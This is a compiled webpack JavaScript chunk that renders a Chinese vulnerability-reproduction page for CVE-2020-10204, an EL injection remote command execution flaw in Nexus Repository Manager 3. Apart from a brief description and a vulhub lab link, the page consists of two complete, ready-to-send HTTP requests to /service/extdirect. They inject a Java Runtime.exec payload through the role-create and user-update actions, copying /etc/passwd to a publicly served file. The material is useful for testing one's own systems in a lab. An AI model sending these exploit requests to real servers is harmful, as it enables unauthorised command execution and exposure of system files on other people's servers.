(window.webpackJsonp=window.webpackJsonp||[]).push([[330],{1836:function(s,t,a){s.exports=a.p+"assets/img/image-20210628181754513.f3e4c135.png"},1837:function(s,t,a){s.exports=a.p+"assets/img/image-20210628191832105.ada1e77c.png"},2527:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"nexus-repository-manger-extdirect-后台远程命令执行-cve-2020-10204"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#nexus-repository-manger-extdirect-后台远程命令执行-cve-2020-10204"}},[s._v("#")]),s._v(" Nexus Repository Manger extdirect 后台远程命令执行 CVE-2020-10204")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发Maven、NuGET等软件源仓库。其3.21.1及之前版本中，存在一处任意EL表达式注入漏洞，这个漏洞是CVE-2018-16621的绕过。")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("Nexus < 3.21.1")]),e("br"),s._v(" "),e("h2",{attrs:{id:"环境搭建"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[s._v("#")]),s._v(" 环境搭建")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10204")]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("漏洞触发需要任意账户权限")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1836),alt:"img"}})]),s._v(" "),e("p",[s._v("该漏洞需要访问更新角色或创建角色接口，登录任意用户后修改 "),e("code",[s._v("NXSESSIONID")])]),s._v(" "),e("p",[s._v("发送请求包执行命令")]),s._v(" "),e("div",{staticClass:"language-json line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-json"}},[e("code",[s._v("POST /service/extdirect HTTP/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" \naccept"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nUser-Agent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" Mozilla/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" (X11; Linux x86_64) AppleWebKit/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" (KHTML"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko) Chrome/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("81.0")]),s._v("."),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("4044.138")]),s._v(" Safari/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nNX-ANTI-CSRF-TOKEN"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("\nContent-Type"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nCookie"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" jenkins-timestamper-offset="),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("-28800000")]),s._v("; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627="),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1583249520")]),s._v("; NX-ANTI-CSRF-TOKEN="),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("; NXSESSIONID=e9d6620d"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("-6843")]),s._v("-49a6-a887-cd7cef74d413\nContent-Length"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("304")]),s._v("\n\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"action"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"coreui_Role"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"method"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"create"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"data"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"version"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('""')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"source"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"default"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"id"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"1111"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"name"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"2222"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"description"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"3333"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"privileges"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\"")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"roles"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"type"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rpc"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"tid"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("89")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br")])]),e("p",[s._v("另一处漏洞点")]),s._v(" "),e("div",{staticClass:"language-json line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-json"}},[e("code",[s._v("POST /service/extdirect HTTP/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" \naccept"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nUser-Agent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" Mozilla/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("5.0")]),s._v(" (X11; Linux x86_64) AppleWebKit/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v(" (KHTML"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" like Gecko) Chrome/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("81.0")]),s._v("."),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("4044.138")]),s._v(" Safari/"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("537.36")]),s._v("\nNX-ANTI-CSRF-TOKEN"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("\nContent-Type"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" application/json\nCookie"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" jenkins-timestamper-offset="),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("-28800000")]),s._v("; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627="),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1583249520")]),s._v("; NX-ANTI-CSRF-TOKEN="),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.856555763510765")]),s._v("; NXSESSIONID=e9d6620d"),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("-6843")]),s._v("-49a6-a887-cd7cef74d413\nContent-Length"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("304")]),s._v("\n\n\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"action"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"coreui_User"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"method"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"update"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"data"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"userId"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"version"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"2"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"firstName"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"lastName"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"email"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"www@qq.com"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"status"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"active"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"roles"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}\"")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"type"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rpc"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token property"}},[s._v('"tid"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("9")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br")])]),e("p",[s._v("访问 vuln.html")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1837),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports}}]);